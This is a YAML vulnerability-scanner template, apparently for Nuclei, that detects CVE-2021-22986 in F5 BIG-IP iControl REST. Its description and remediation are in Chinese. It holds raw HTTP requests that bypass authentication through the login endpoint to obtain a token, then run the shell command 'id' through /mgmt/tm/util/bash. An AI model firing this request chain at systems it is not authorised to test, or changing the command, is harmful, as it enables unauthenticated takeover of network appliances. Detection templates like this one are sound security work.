id: CVE-2021-22986
info:
  name: F5 BIG-IP iControl REST - Remote Command Execution
  author:
  - l0ne1y
  tags:
  - bigip
  - cve
  - cve2021
  - rce
  - mirai
  description: |-
    F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞
    F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。

    F5 BIG-IP 存在安全漏洞，该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。
  reference:
  - https://attackerkb.com/topics/j6pweg5sag/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
  - https://support.f5.com/csp/article/k03009991
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-22986
  severity: critical
  classification:
    cve-id:
    - cve-2021-22986
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://support.f5.com/csp/article/K03009991
requests:
- matchers:
  - type: word
    condition: and
    words:
    - commandResult
    - uid=
  extractors:
  - name: token
    type: regex
    regex:
    - ([A-Z0-9]{26})
    group: 1
    part: body
    internal: true
  - type: regex
    regex:
    - '"commandResult":"(.*)"'
    group: 1
    part: body
  raw:
  - |
    POST /mgmt/shared/authn/login HTTP/1.1
    Host: {{Hostname}}
    Accept-Language: en
    Authorization: Basic YWRtaW46
    Content-Type: application/json
    Cookie: BIGIPAuthCookie=1234

    {"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}
  - |
    POST /mgmt/tm/util/bash HTTP/1.1
    Host: {{Hostname}}
    Accept-Language: en
    X-F5-Auth-Token: {{token}}
    Content-Type: application/json

    {"command":"run","utilCmdArgs":"-c id"}
